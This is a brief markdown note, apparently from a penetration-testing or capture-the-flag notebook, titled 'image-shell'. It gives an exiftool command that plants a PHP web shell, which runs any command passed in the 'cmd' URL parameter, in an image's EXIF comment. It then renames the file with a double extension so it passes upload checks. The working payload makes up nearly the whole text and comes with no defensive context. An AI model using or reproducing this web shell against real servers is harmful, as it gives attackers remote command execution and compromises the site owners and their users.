# image-shell
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.png
```
Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file

mv image.png image.php.png
